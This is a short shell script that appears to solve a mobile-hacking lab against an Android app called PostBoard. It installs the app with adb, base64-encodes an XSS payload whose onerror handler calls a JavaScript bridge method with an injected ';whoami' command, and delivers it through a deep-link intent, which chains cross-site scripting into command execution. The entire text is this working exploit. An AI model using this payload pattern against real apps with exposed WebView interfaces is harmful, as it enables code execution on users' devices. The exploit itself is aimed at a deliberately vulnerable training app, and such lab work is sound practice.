adb install com.mobilehackinglab.postboard.apk
PAYLOAD=$(base64 <<< '<img src=error onerror=WebAppInterface.postCowsayMessage(";whoami")>')
adb shell "am start -a android.intent.action.VIEW -d postboard://postmessage/${PAYLOAD} -n com.mobilehackinglab.postboard/.MainActivity"
adb shell 'am start -a android.intent.action.VIEW -d postboard://postmessage/ -n com.mobilehackinglab.postboard/.MainActivity'

